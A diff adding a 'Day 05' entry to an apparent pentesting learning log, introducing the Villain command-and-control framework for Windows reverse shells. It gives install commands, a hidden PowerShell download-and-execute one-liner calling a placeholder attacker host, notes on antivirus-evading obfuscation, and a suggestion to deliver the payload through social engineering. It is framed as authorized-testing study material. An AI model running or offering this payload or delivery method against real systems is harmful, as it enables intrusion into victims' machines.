@@ -111,6 +111,46 @@ Bn-As-O-oN--script-vv-p-sS-sT:
 - -sT: A TCP connect scan option in Nmap, used when SYN scan isn’t possible.
 So, if this is part of an Nmap command
 
+# Day 05
+**Creating Reverse shell for Windows Hacking using Villain FrameWork**
+
+Villain is a high-level Stage 0/1 command-and-control (C2) framework that:
+- Handles multiple reverse TCP and HoaxShell-based shells
+- Enhances shell functionality with built-in utilities
+- Supports session sharing across sibling servers (other Villain instances)
+- Offers payload generation, obfuscation, and fileless execution features
+
+**Install Villain on Kali Linux**
+Villain is optimized for Kali Linux but can be adapted for other platforms with Python support.
+**code snippets:**
+git clone https://github.com/t3l3machus/Villain
+cd Villain
+pip3 install -r requirements.txt
+sudo apt install gnome-terminal
+
+**Generate Payload**
+Villain supports PowerShell-based payloads
+**code snippets:**
+powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker-ip>:<port>/payload.ps1')"
+
+You can use Villain’s built-in payload generator or customize your own:
+**code snippets:**
+python3 Villain.py -p 443
+
+**Obfuscate Payload (Optional)**:
+**Villain includes auto-obfuscation to bypass AV:**
+- Encodes PowerShell commands
+- Wraps them in try-catch blocks to preserve stderr
+- Avoids common shell hang-ups
+**Execution on Target (Windows):**
+- Use social engineering or exploit delivery to run the obfuscated PowerShell payload on the target.
+- Once executed, the shell connects back to your Villain server.
+**Legal Disclaimer:**
+Using Villain or any reverse shell against systems without explicit permission is illegal. This tool is intended for authorized penetration testing and CTF environments only.
+**Villain Framework – Command Reference:**
+A categorized list of Villain C2 Framework commands with their uses.
+Use this for penetration testing in authorized lab environments only.
+
 
 
 
